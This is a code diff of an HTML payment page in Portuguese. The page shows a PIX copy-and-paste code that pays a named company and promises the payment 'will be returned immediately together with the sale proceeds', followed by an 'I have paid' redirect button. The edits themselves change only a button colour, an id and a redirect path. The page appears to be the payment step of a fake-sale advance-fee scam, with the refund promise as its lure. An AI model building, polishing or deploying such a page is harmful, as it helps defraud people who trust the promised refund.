@@ -124,6 +124,10 @@
                 font-size: 12px;
             }
         }
+
+        #btn-pix {
+            background-color: #884BC5;
+        }
     </style>
     <script>
         function copyToClipboard() {
@@ -135,7 +139,7 @@
 
         function delayedRedirect() {
             setTimeout(function() {
-                window.location.href = "../página-inicial/index.html";
+                window.location.href = "/inicial.html";
             }, 200)
         }
     </script>
@@ -153,7 +157,7 @@
         <p>Copie o código abaixo para o PIX (Copiar e Colar).</p>
         <p>Este valor será devolvido imediatamente junto aos valores da venda.</p>
         <textarea id="pix-code" style="width: 597px; margin: 0px auto; height: 70px;">00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/c2ff7685-fb3f-42ed-9836-a4321f0aeaf15204000053039865802BR5924PAULO_R_LEMOS_E_CIA_LTDA6014RIO_DE_JANEIRO62070503***63043B53</textarea>
-        <button onclick="copyToClipboard()">Copiar pix</button>
+        <button onclick="copyToClipboard()" id="btn-pix">Copiar pix</button>
         <button onclick="delayedRedirect()">Efetuei o pagamento</button>
         <div class="dados-pagamento">
             <p><strong>Dados de pagamento</strong></p>
